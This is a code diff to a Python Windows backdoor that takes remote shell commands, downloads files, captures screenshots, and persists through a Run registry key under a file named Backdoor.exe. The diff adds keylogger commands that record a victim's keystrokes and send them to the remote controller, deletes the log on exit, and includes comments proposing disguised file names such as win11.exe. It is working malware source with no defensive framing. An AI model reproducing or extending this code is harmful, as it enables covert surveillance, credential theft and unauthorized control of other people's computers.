@@ -9,6 +9,9 @@ import base64
 import requests
 import ctypes
 from mss import mss
+import threading
+import key
+
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -57,6 +60,10 @@ def shell():
     while True:
         command = reliable_recv()
         if command == 'q':
+            try:
+                os.remove(keylogger_path)
+            except: 
+                continue
             break
         elif command == 'help':
             help_option = ''' 
@@ -65,7 +72,9 @@ def shell():
                             get <url> - Download a file from the specified url
                             start <app> - Start tunning specific application on the target machine
                             screenshot - Take a screenshot on the target machine
-                            check - Chem for aministrator privileges
+                            check - Chek for aministrator privileges
+                            keylog_start -> Start keylogger on target pc
+                            keylog_dump -> Print out keystrokes Captured by keylogger
                           '''
             reliable_send(help_option)
         elif command[:2] == 'cd' and len(command) > 1:
@@ -113,6 +122,12 @@ def shell():
                 reliable_send(admin)
             except:
                 reliable_send('Can\'t Perform The Check')
+        elif command[:12] == "keylog_start":
+            t1 = threading.Thread(target=key.start) # start keylogger
+            t1.start()
+        elif command[:11] == 'keylog_dump': # BUG?
+            file_read = open(keylogger_path, 'r')
+            reliable_send(file_read.read())
         else:
             try:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Executes a shell command and captures its output and errors
@@ -121,7 +136,8 @@ def shell():
             except:
                 reliable_send("[!!] Can't Execute the Command")
 
-location = os.environ['appdata'] + '\\Backdoor.exe'
+keylogger_path = os.environ['appdata'] + '\\logger.txt' # added later, could be: proc_manager.txt
+location = os.environ['appdata'] + '\\Backdoor.exe' # could be: win11.exe
 if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True) # Adds a registry key to make the script persist by running automatically on Windows startup.
